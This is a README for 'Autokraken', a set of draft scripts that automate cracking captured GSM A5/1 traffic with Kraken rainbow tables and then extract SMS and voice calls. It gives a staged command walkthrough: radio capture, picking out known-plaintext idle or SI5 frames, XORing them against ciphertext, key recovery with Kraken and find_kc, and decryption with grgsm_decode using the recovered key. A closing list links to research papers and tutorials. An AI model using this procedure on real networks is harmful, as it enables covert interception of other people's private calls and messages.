# Autokraken

_Warning: those are currently dirty drafts.  It works for us but would need to be heavily reviewed to work any other platform._

A set of scripts to automate the cracking of captured GSM/G2 network traffic with Kraken, and to extract SMS and voice calls out of it.  This is not frequency hopping capable.

## Requirements

Few command line utilities

        which sed
        which awk
        which grep
        which cut
        which wc

Few packages for stage 1

        apt install python3 tcpdump tshark gr-gsm -y

Optionally `gsmframedecoder` when dealing with SI5,6 instead of idle frames, but then you would also need obtain HEX version of the bursts, be it with the old Airprobe or Wireshark

	cd /root/KRAKEN/
	#git clone https://github.com/flyopenair/gsmframecoder.git
	wget http://www.ks.uni-freiburg.de/download/misc/gsmframecoder.tar.gz
	tar xzf gsmframecoder.tar.gz
	cd gsmframecoder/
	g++ BitVector.cpp GSMFrameCoder2.cpp -o gsmframecoder

And of course Kraken with ready to serve rainbow table indexes

## Introduction

You can separate stages 0,1 and 2,3 for resp. capturing and cracking.  Simply send the bitstring file from the former to the latter and proceed.

## Stage 0 - capture and get the cfile(s) ready


        cd /root/KRAKEN/autokraken/stage0/

PPM is hardcoded for convenience, you have to tune it for now

	vi capture.bash

	hppm=

recording for 140 seconds

	arfcn=
	rm -f /root/capture/$arfcn.cfile*
	./capture.bash $arfcn

## Stage 1 - define known plain-text frame

_requires GR-GSM and a cfile_

Extract broadcast control channel

        cd /root/KRAKEN/autokraken/stage1/
	./json0C $arfcn

and take the chance to check that there is no hopping

Find out about the SDCCH timeslot and subchannel numbers to track

	#./parse.py 0C /root/capture/$arfcn.cfile.0C.json
	./jsonreader.py /root/capture/$arfcn.cfile.0C.json

	slot=
	sub=

Extract dedicated control channel and look for idling frames or SI5,6 around the Ciphering Mode Command.  It is necessary here to specify the subchannel so we won't get any irrelevant frames and bitstrings to crack later-on.

	echo $arfcn $slot $sub
	./jsonXS $arfcn $slot $sub

and take the chance to check that we've got A5/1 here, not A5/3.  This is also the time when you should check for `2b` padding in idlinig frames.  If there is randomization there, your only chance is to look for SI5,5ter,6 frames.

Now seek for idling frames and SI5,5ter,6 around the Ciphering Mode Command

	#./parse.py XS /root/capture/$arfcn.cfile.${slot}S$sub.json
	./grabCMC $arfcn $slot $sub

	plainframe=

Eventually send the bitstring file to the Kraken server.

        scp /root/capture/$arfcn.cfile.${slot}S$sub kraken:/root/capture/

## Stage 1.5 - SI5 Timing Advance

_skip this step for idling frame_

Have a look at Timing Advance and in case it is not `x00` already, copy/paste the HEX from wireshark starting at SACCH L1 Header (23 bytes).
Look byte offset `1`.
Turn it to `x00` then convert to bitstrings with gsmframedecoder.

	/root/KRAKEN/gsmframecoder/gsmframecoder 05 00 ... | grep ^[[:digit:]] > /root/capture/si5
	/root/KRAKEN/gsmframecoder/gsmframecoder 05 00 ... | grep ^[[:digit:]] > /root/capture/si5ter
	/root/KRAKEN/gsmframecoder/gsmframecoder 05 00 ... | grep ^[[:digit:]] > /root/capture/si6

## Stage 2 - define the cipher-text frames

_requires Kraken and the bitstring file_

Make sure the variables are still defined

	screen -S KRAKEN
	cd /root/KRAKEN/autokraken/stage2/

Tune your path against Kraken and Utilities

        vi feedcrack.conf

	kraken=/root/KRAKEN/kraken

XOR plain bitstrings with cipher bitstrings for idling frames

	echo $arfcn $slot $sub $plainframe
	./getemptyframeplain /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
	./getemptyframecipher /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
	./feedemptyframe /root/capture/$arfcn.cfile.${slot}S$sub $plainframe

--or-- for SI5

	ls -lhF /root/capture/si5
        echo $arfcn $slot $sub $plainframe
	./guesssi5 /root/capture/$arfcn.cfile.${slot}S$sub $plainframe
	./feedcrack /root/capture/$arfcn.cfile.${slot}S$sub $plainframe

Feed those to Kraken

	cd /root/KRAKEN/kraken/Kraken/
	ls -lhF /dev/sdb2
	ls -lhF ../indexes/

crack idling frames --or-- crack SI5,6 frames

	head /root/capture/crackidlexors
	head /root/capture/crackxors
        ./kraken ../indexes < /root/capture/crackidlexors
        ./kraken ../indexes < /root/capture/crackxors

## Stage 2 automated

_draft_

	./crack /root/capture/$arfcn.cfile.${slot}S$sub $plainframe

## Stage 3 - verify the key

Tune the hardcoded path against Utilities

	cd /root/KRAKEN/autokraken/stage3/
	vi feedkc

	utilspath=/root/KRAKEN/kraken/Utilities

reach back to the previous frame number and xored bitstring to feed the key check

	./feedkc <xored bitstring> /root/capture/crackidlexors1234 /root/capture/crackidlecipher
	./feedkc <xored bitstring> /root/capture/crackxors1234 /root/capture/si5.guessed.frame

COPY/PASTE THE KEY AND @ E.G.

	/root/KRAKEN/kraken/Utilities/find_kc <FOUND KEY> <BITOPS> <BURST FRAME NUMBER> \
		<PREV BURST FRAME NUMBER> <PREV BURST XORED BITSTRING>

## Acceptance

You can now sniff into the ciphered text

	grgsm_decode --cfile=/root/capture/$arfcn.cfile --arfcn=$arfcn --mode=SDCCH8 \
		--timeslot=$slot --subslot=$sub --a5=1 --kc=KEY-HERE

## Resources

### theory

Breaking GSM phone privacy
https://srlabs.de/wp-content/uploads/2010/07/100729.Breaking.GSM_.Privacy.BlackHat1-1.pdf

https://brmlab.cz/project/gsm/deka/attack-theory

https://opensource.srlabs.de/projects/a51-decrypt/wiki

https://opensource.srlabs.de/projects/a51-decrypt/wiki/A51

https://opensource.srlabs.de/projects/a51-decrypt/wiki/Backclocking

### kraken

https://github.com/joswr1ght/kraken

https://github.com/cdeletre/dockraken

### tables

https://github.com/0xh4di/GSMDecryption

### & friends

Deka - an OpenCL A5/1 cracker
https://brmlab.cz/project/gsm/deka/start

### tutorials

[A51] Finding Kc with Kraken (dotting the i's)
https://web.archive.org/web/20160310052957/https://lists.srlabs.de/pipermail/a51/2010-July/000688.html

GSM Cracking: Kraken Install & Test – Software Defined Radio Series #15
https://www.crazydanishhacker.com/gsm-cracking-kraken-install-test-software-defined-radio-series-15/

GSM Cracking: SMS w/ Kraken – Software Defined Radio Series #16
https://www.crazydanishhacker.com/gsm-cracking-sms-kraken-software-defined-radio-series-16/

Bosma, Soeurt, 2012
Eavesdropping on and decrypting of GSM communication
https://www.os3.nl/_media/2016-2017/courses/ot/jeffrey_joris.pdf

GSM hack France
https://hackbbs.org:86/index.php/GSM_hack_France

Practical exercise on the GSM Encryption A5/1
https://lynxnuzlan.wordpress.com/2011/02/23/practical-exercise-on-the-gsm-encryption-a51/

The big GSM write-up – how to capture, analyze and crack GSM? – 1.
https://domonkos.tomcsanyi.net/?p=418

<--
### similar projects

gsmtk - GSM sniffing toolkit
https://jenda.hrach.eu/w/gsm

GSM Assessment Toolkit
https://github.com/romankh/gsm-assessment-toolkit
-->

